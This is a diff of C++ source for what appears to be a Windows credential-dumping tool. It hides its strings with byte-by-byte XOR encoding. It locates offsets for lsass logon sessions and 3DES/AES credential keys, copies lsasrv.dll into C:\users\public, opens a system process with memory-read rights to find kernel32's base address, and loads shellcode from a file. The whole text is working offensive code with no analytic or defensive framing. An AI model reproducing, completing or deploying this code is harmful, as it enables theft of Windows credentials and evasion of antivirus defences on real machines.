+				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 101; _fuckingstring[2] = 52; _fuckingstring[3] = 33; _fuckingstring[4] = 108; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 108; _fuckingstring[8] = 96; _fuckingstring[9] = 117; _fuckingstring[10] = 98; _fuckingstring[11] = 105; _fuckingstring[12] = 45; _fuckingstring[13] = 33; _fuckingstring[14] = 98; _fuckingstring[15] = 110; _fuckingstring[16] = 111; _fuckingstring[17] = 117; _fuckingstring[18] = 104; _fuckingstring[19] = 111; _fuckingstring[20] = 116; _fuckingstring[21] = 100; _fuckingstring[22] = 33; _fuckingstring[23] = 114; _fuckingstring[24] = 100; _fuckingstring[25] = 96; _fuckingstring[26] = 115; _fuckingstring[27] = 98; _fuckingstring[28] = 105; _fuckingstring[29] = 104; _fuckingstring[30] = 111; _fuckingstring[31] = 102; _fuckingstring[32] = 11; _fuckingstring[33] = 1; FBXorCrypt(_fuckingstring, 34);
+				printf(_fuckingstring); continue;
+
+			}
+
+			offset = 1;
+
+			// svchost.exeshellcode
+
+			char write_out[123] = { 0 };
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 50; _fuckingstring[3] = 101; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out, 123, _fuckingstring, i);
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 54; _fuckingstring[3] = 101; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out + 3, 120, _fuckingstring, pid);
+
+
+
+			// _offset_tableindex
+
+			// logonsessionlist3desaescredentiallogonsessionlist
+
+			//   3bytes  
+
+			// 7lsass pid
+
+			// 80816
+
+			// 8   432
+
+
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out + 3 + 7, 123, _fuckingstring, _offset_table[i][0]);
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out + 3 + 7 + 8, 123, _fuckingstring, _offset_table[i][1]);
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, _fuckingstring, _offset_table[i][2]);
+
+			// credential offset
+
+		//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
+
+			// 
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 57; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, _fuckingstring, offset____);
+
+			// 
+
+				// _3des_aes_len_offset   windows10windows7
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 51; _fuckingstring[3] = 121; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, _fuckingstring, _offset_table[i][4]);
+
+
+
+			// 
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 114; _fuckingstring[2] = 1; FBXorCrypt(_fuckingstring, 3);
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8 + 2, 123, _fuckingstring, res);
+
+
+
+
+
+			FILE* fptr;
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
+			if (FBFileExists(_fuckingstring))DeleteFileA(_fuckingstring);
+
+			// Open a file in writing mode
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
+			fopen_s(&fptr, _fuckingstring, "w");
+
+
+
+			// Write some text to the file
+
+			fprintf(fptr, write_out);
+
+
+
+			// Close the file
+
+			fclose(fptr);
+
+			break;
+
+		}
+
+	}
+
+	if (!offset) {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 44; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 116; _fuckingstring[5] = 111; _fuckingstring[6] = 106; _fuckingstring[7] = 111; _fuckingstring[8] = 110; _fuckingstring[9] = 118; _fuckingstring[10] = 111; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 100; _fuckingstring[14] = 115; _fuckingstring[15] = 114; _fuckingstring[16] = 104; _fuckingstring[17] = 110; _fuckingstring[18] = 111; _fuckingstring[19] = 33; _fuckingstring[20] = 110; _fuckingstring[21] = 115; _fuckingstring[22] = 33; _fuckingstring[23] = 111; _fuckingstring[24] = 110; _fuckingstring[25] = 33; _fuckingstring[26] = 108; _fuckingstring[27] = 101; _fuckingstring[28] = 52; _fuckingstring[29] = 33; _fuckingstring[30] = 108; _fuckingstring[31] = 96; _fuckingstring[32] = 117; _fuckingstring[33] = 98; _fuckingstring[34] = 105; _fuckingstring[35] = 100; _fuckingstring[36] = 101; _fuckingstring[37] = 45; _fuckingstring[38] = 33; _fuckingstring[39] = 96; _fuckingstring[40] = 99; _fuckingstring[41] = 110; _fuckingstring[42] = 115; _fuckingstring[43] = 117; _fuckingstring[44] = 47; _fuckingstring[45] = 47; _fuckingstring[46] = 47; _fuckingstring[47] = 11; _fuckingstring[48] = 1; FBXorCrypt(_fuckingstring, 49);
+		printf(_fuckingstring);
+
+		free(res);
+
+		// 
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
+		char PasdadsaATH[1024];
+		memcpy(PasdadsaATH, _fuckingstring, 100);
+
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 56; _fuckingstring[17] = 96; _fuckingstring[18] = 117; _fuckingstring[19] = 51; _fuckingstring[20] = 1; FBXorCrypt(_fuckingstring, 21);
+		char PasdadsaATH2[100];
+		memcpy(PasdadsaATH2, _fuckingstring, 100);
+
+		if (FBFileExists(PasdadsaATH2))DeleteFileA(PasdadsaATH2);
+
+		CopyFileA(PasdadsaATH, PasdadsaATH2, FALSE);
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 104; _fuckingstring[2] = 109; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 98; _fuckingstring[6] = 110; _fuckingstring[7] = 113; _fuckingstring[8] = 104; _fuckingstring[9] = 100; _fuckingstring[10] = 101; _fuckingstring[11] = 33; _fuckingstring[12] = 117; _fuckingstring[13] = 110; _fuckingstring[14] = 33; _fuckingstring[15] = 113; _fuckingstring[16] = 116; _fuckingstring[17] = 99; _fuckingstring[18] = 109; _fuckingstring[19] = 104; _fuckingstring[20] = 98; _fuckingstring[21] = 33; _fuckingstring[22] = 103; _fuckingstring[23] = 110; _fuckingstring[24] = 109; _fuckingstring[25] = 101; _fuckingstring[26] = 100; _fuckingstring[27] = 115; _fuckingstring[28] = 33; _fuckingstring[29] = 38; _fuckingstring[30] = 56; _fuckingstring[31] = 96; _fuckingstring[32] = 117; _fuckingstring[33] = 51; _fuckingstring[34] = 38; _fuckingstring[35] = 45; _fuckingstring[36] = 113; _fuckingstring[37] = 109; _fuckingstring[38] = 100; _fuckingstring[39] = 96; _fuckingstring[40] = 114; _fuckingstring[41] = 100; _fuckingstring[42] = 33; _fuckingstring[43] = 115; _fuckingstring[44] = 100; _fuckingstring[45] = 117; _fuckingstring[46] = 115; _fuckingstring[47] = 104; _fuckingstring[48] = 100; _fuckingstring[49] = 119; _fuckingstring[50] = 100; _fuckingstring[51] = 33; _fuckingstring[52] = 104; _fuckingstring[53] = 117; _fuckingstring[54] = 11; _fuckingstring[55] = 1; FBXorCrypt(_fuckingstring, 56);
+		printf(_fuckingstring);
+
+		// 
 
 #ifdef jinyongyutiaoshi
 
@@ -1312,11 +1326,11 @@ if (!offset) {
 
 
 
-	exit(-1);
+		exit(-1);
 
-}
+	}
 
-free(res);
+	free(res);
 
 
 
@@ -1330,8 +1344,8 @@ caonimade:
 
 #ifdef jinyongyutiaoshi
 
-//MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 33; _fuckingstring[23] = 44; _fuckingstring[24] = 33; _fuckingstring[25] = 66; _fuckingstring[26] = 110; _fuckingstring[27] = 113; _fuckingstring[28] = 120; _fuckingstring[29] = 1; FBXorCrypt(_fuckingstring, 30);
-//CopyFileA(_fuckingstring, "C:\\users\\public\\ili6ao", TRUE);
+	//MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 33; _fuckingstring[23] = 44; _fuckingstring[24] = 33; _fuckingstring[25] = 66; _fuckingstring[26] = 110; _fuckingstring[27] = 113; _fuckingstring[28] = 120; _fuckingstring[29] = 1; FBXorCrypt(_fuckingstring, 30);
+	//CopyFileA(_fuckingstring, "C:\\users\\public\\ili6ao", TRUE);
 
 #endif // jinyongyutiaoshi
 
@@ -1343,11 +1357,11 @@ caonimade:
 
 // svchostpid
 
-DWORD _svchost_1_pid = GetLsvchostsassPid();
+	DWORD _svchost_1_pid = GetLsvchostsassPid();
 
 
 
-//notepad
+	//notepad
 
 #ifdef jinyongyutiaoshi
 
@@ -1365,100 +1379,103 @@ DWORD _svchost_1_pid = GetLsvchostsassPid();
 
 	  // Open the target process
 
-HANDLE target_hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _svchost_1_pid);
+	HANDLE target_hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _svchost_1_pid);
 
-DWORD64 _target_process_kernel32_base_addr = 0;
+	DWORD64 _target_process_kernel32_base_addr = 0;
 
-if (target_hProcess) {
+	if (target_hProcess) {
 
-	HMODULE hModuleArray[1024];
+		HMODULE hModuleArray[1024];
 
-	DWORD cbNeeded;
-
-
-
-	// Enumerate the modules of the target process
-
-	if (EnumProcessModules(target_hProcess, hModuleArray, sizeof(hModuleArray), &cbNeeded)) {
-
-		for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-
-			char szModuleName[MAX_PATH];
+		DWORD cbNeeded;
 
 
 
-			// Get the module file name
+		// Enumerate the modules of the target process
 
-			if (GetModuleFileNameExA(target_hProcess, hModuleArray[i], szModuleName, MAX_PATH)) {
+		if (EnumProcessModules(target_hProcess, hModuleArray, sizeof(hModuleArray), &cbNeeded)) {
+
+			for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+
+				char szModuleName[MAX_PATH];
+
+
+
+				// Get the module file name
+
+				if (GetModuleFileNameExA(target_hProcess, hModuleArray[i], szModuleName, MAX_PATH)) {
 
 #ifdef jinyongyutiaoshi
 
-				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 110; _fuckingstring[2] = 101; _fuckingstring[3] = 116; _fuckingstring[4] = 109; _fuckingstring[5] = 100; _fuckingstring[6] = 33; _fuckingstring[7] = 111; _fuckingstring[8] = 96; _fuckingstring[9] = 108; _fuckingstring[10] = 100; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
-				printf(_fuckingstring, szModuleName);
+					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 110; _fuckingstring[2] = 101; _fuckingstring[3] = 116; _fuckingstring[4] = 109; _fuckingstring[5] = 100; _fuckingstring[6] = 33; _fuckingstring[7] = 111; _fuckingstring[8] = 96; _fuckingstring[9] = 108; _fuckingstring[10] = 100; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
+					printf(_fuckingstring, szModuleName);
 
 #endif // jinyongyutiaoshi
 
-				// modulekernel32.dll
+					// modulekernel32.dll
 
-				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
-				//char _fuckingstring[13] = _fuckingstring;
+					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 106; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 111; _fuckingstring[4] = 100; _fuckingstring[5] = 109; _fuckingstring[6] = 50; _fuckingstring[7] = 51; _fuckingstring[8] = 47; _fuckingstring[9] = 101; _fuckingstring[10] = 109; _fuckingstring[11] = 109; _fuckingstring[12] = 1; FBXorCrypt(_fuckingstring, 13);
+					//char _fuckingstring[13] = _fuckingstring;
 
-				//if (strcmp("kernel32.dll", szModuleName) == 0 || strcmp("KERNEL32.DLL", szModuleName) == 0) {
+					//if (strcmp("kernel32.dll", szModuleName) == 0 || strcmp("KERNEL32.DLL", szModuleName) == 0) {
 
-				//	// base addr
+					//	// base addr
 
-				//	_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
+					//	_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
 
-				//	break;
+					//	break;
 
-				//}
+					//}
 
-				int flag = 1;
+					int flag = 1;
 
-				for (int j = 0; j < 12; j++) {
+					for (int j = 0; j < 12; j++) {
 
-					if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j] - 32 != szModuleName[strlen(szModuleName) - 1 - j])) {
+						if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j] - 32 != szModuleName[strlen(szModuleName) - 1 - j])) {
 
-						flag = 0;
+							flag = 0;
+
+							break;
+
+
+
+						}
+
+					}
+
+					if (flag) {
+
+						_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
 
 						break;
-
-
 
 					}
 
 				}
 
-				if (flag) {
-
-					_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
-
-					break;
-
-				}
-
 			}
 
 		}
 
+
+
+		// Close the handle to the target process
+
+		CloseHandle(target_hProcess);
+
+	}
+
+	else {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 98; _fuckingstring[1] = 96; _fuckingstring[2] = 111; _fuckingstring[3] = 33; _fuckingstring[4] = 111; _fuckingstring[5] = 110; _fuckingstring[6] = 117; _fuckingstring[7] = 33; _fuckingstring[8] = 110; _fuckingstring[9] = 113; _fuckingstring[10] = 100; _fuckingstring[11] = 111; _fuckingstring[12] = 33; _fuckingstring[13] = 117; _fuckingstring[14] = 96; _fuckingstring[15] = 115; _fuckingstring[16] = 102; _fuckingstring[17] = 100; _fuckingstring[18] = 117; _fuckingstring[19] = 33; _fuckingstring[20] = 113; _fuckingstring[21] = 115; _fuckingstring[22] = 110; _fuckingstring[23] = 98; _fuckingstring[24] = 100; _fuckingstring[25] = 114; _fuckingstring[26] = 114; _fuckingstring[27] = 45; _fuckingstring[28] = 33; _fuckingstring[29] = 100; _fuckingstring[30] = 115; _fuckingstring[31] = 115; _fuckingstring[32] = 110; _fuckingstring[33] = 115; _fuckingstring[34] = 33; _fuckingstring[35] = 98; _fuckingstring[36] = 110; _fuckingstring[37] = 101; _fuckingstring[38] = 100; _fuckingstring[39] = 59; _fuckingstring[40] = 33; _fuckingstring[41] = 36; _fuckingstring[42] = 121; _fuckingstring[43] = 11; _fuckingstring[44] = 1; FBXorCrypt(_fuckingstring, 45);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
 	}
 
 
 
-	// Close the handle to the target process
-
-	CloseHandle(target_hProcess);
-
-}
-
-else {
-
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 98; _fuckingstring[1] = 96; _fuckingstring[2] = 111; _fuckingstring[3] = 33; _fuckingstring[4] = 111; _fuckingstring[5] = 110; _fuckingstring[6] = 117; _fuckingstring[7] = 33; _fuckingstring[8] = 110; _fuckingstring[9] = 113; _fuckingstring[10] = 100; _fuckingstring[11] = 111; _fuckingstring[12] = 33; _fuckingstring[13] = 117; _fuckingstring[14] = 96; _fuckingstring[15] = 115; _fuckingstring[16] = 102; _fuckingstring[17] = 100; _fuckingstring[18] = 117; _fuckingstring[19] = 33; _fuckingstring[20] = 113; _fuckingstring[21] = 115; _fuckingstring[22] = 110; _fuckingstring[23] = 98; _fuckingstring[24] = 100; _fuckingstring[25] = 114; _fuckingstring[26] = 114; _fuckingstring[27] = 45; _fuckingstring[28] = 33; _fuckingstring[29] = 100; _fuckingstring[30] = 115; _fuckingstring[31] = 115; _fuckingstring[32] = 110; _fuckingstring[33] = 115; _fuckingstring[34] = 33; _fuckingstring[35] = 98; _fuckingstring[36] = 110; _fuckingstring[37] = 101; _fuckingstring[38] = 100; _fuckingstring[39] = 59; _fuckingstring[40] = 33; _fuckingstring[41] = 36; _fuckingstring[42] = 121; _fuckingstring[43] = 11; _fuckingstring[44] = 1; FBXorCrypt(_fuckingstring, 45);
-	printf(_fuckingstring, (unsigned int)GetLastError());
-
-	exit(-1);
-
-}
 
 
 
@@ -1477,804 +1494,801 @@ else {
 
 
 
+	// shellcode
+
+	// shellcodePE
+
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 101; _fuckingstring[17] = 96; _fuckingstring[18] = 117; _fuckingstring[19] = 96; _fuckingstring[20] = 47; _fuckingstring[21] = 99; _fuckingstring[22] = 104; _fuckingstring[23] = 111; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
+	const char* filePath = _fuckingstring; // Replace with your file path
 
 
 
-// shellcode
+	// Open the file for reading
 
-// shellcodePE
+	HANDLE hFile = CreateFileA(
 
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 101; _fuckingstring[17] = 96; _fuckingstring[18] = 117; _fuckingstring[19] = 96; _fuckingstring[20] = 47; _fuckingstring[21] = 99; _fuckingstring[22] = 104; _fuckingstring[23] = 111; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
-const char* filePath = _fuckingstring; // Replace with your file path
+		filePath,                   // File path
 
+		GENERIC_READ,               // Access mode (read)
 
+		FILE_SHARE_READ,            // Share mode (allow others to read)
 
-// Open the file for reading
+		NULL,                       // Security attributes (default)
 
-HANDLE hFile = CreateFileA(
+		OPEN_EXISTING,              // Creation disposition (open only if it exists)
 
-	filePath,                   // File path
+		FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
 
-	GENERIC_READ,               // Access mode (read)
+		NULL                        // Template file (not used)
 
-	FILE_SHARE_READ,            // Share mode (allow others to read)
-
-	NULL,                       // Security attributes (default)
-
-	OPEN_EXISTING,              // Creation disposition (open only if it exists)
-
-	FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
-
-	NULL                        // Template file (not used)
-
-);
+	);
 
 
 
-if (hFile == INVALID_HANDLE_VALUE) {
+	if (hFile == INVALID_HANDLE_VALUE) {
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 110; _fuckingstring[7] = 113; _fuckingstring[8] = 100; _fuckingstring[9] = 111; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 117; _fuckingstring[15] = 105; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 103; _fuckingstring[19] = 104; _fuckingstring[20] = 109; _fuckingstring[21] = 100; _fuckingstring[22] = 11; _fuckingstring[23] = 1; FBXorCrypt(_fuckingstring, 24);
-	fprintf(stderr, _fuckingstring);
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 110; _fuckingstring[7] = 113; _fuckingstring[8] = 100; _fuckingstring[9] = 111; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 117; _fuckingstring[15] = 105; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 103; _fuckingstring[19] = 104; _fuckingstring[20] = 109; _fuckingstring[21] = 100; _fuckingstring[22] = 11; _fuckingstring[23] = 1; FBXorCrypt(_fuckingstring, 24);
+		fprintf(stderr, _fuckingstring);
 
-	return 1;
+		return 1;
 
-}
+	}
 
 
 
-// Get the file size
+	// Get the file size
 
-DWORD fileSize = GetFileSize(hFile, NULL);
+	DWORD fileSize = GetFileSize(hFile, NULL);
 
-if (fileSize == INVALID_FILE_SIZE) {
+	if (fileSize == INVALID_FILE_SIZE) {
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 102; _fuckingstring[7] = 100; _fuckingstring[8] = 117; _fuckingstring[9] = 117; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 104; _fuckingstring[16] = 109; _fuckingstring[17] = 100; _fuckingstring[18] = 33; _fuckingstring[19] = 114; _fuckingstring[20] = 104; _fuckingstring[21] = 123; _fuckingstring[22] = 100; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
-	fprintf(stderr, _fuckingstring);
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 102; _fuckingstring[7] = 100; _fuckingstring[8] = 117; _fuckingstring[9] = 117; _fuckingstring[10] = 104; _fuckingstring[11] = 111; _fuckingstring[12] = 102; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 104; _fuckingstring[16] = 109; _fuckingstring[17] = 100; _fuckingstring[18] = 33; _fuckingstring[19] = 114; _fuckingstring[20] = 104; _fuckingstring[21] = 123; _fuckingstring[22] = 100; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
+		fprintf(stderr, _fuckingstring);
+
+		CloseHandle(hFile);
+
+		return 1;
+
+	}
+
+
+
+	// Allocate memory for the byte array
+
+	BYTE* byteArray = (BYTE*)malloc(fileSize);
+
+	if (byteArray == NULL) {
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 68; _fuckingstring[1] = 115; _fuckingstring[2] = 115; _fuckingstring[3] = 110; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 96; _fuckingstring[7] = 109; _fuckingstring[8] = 109; _fuckingstring[9] = 110; _fuckingstring[10] = 98; _fuckingstring[11] = 96; _fuckingstring[12] = 117; _fuckingstring[13] = 104; _fuckingstring[14] = 111; _fuckingstring[15] = 102; _fuckingstring[16] = 33; _fuckingstring[17] = 108; _fuckingstring[18] = 100; _fuckingstring[19] = 108; _fuckingstring[20] = 110; _fuckingstring[21] = 115; _fuckingstring[22] = 120; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
+		fprintf(stderr, _fuckingstring);
+
+		CloseHandle(hFile);
+
+		return 1;
+
+	}
+
+
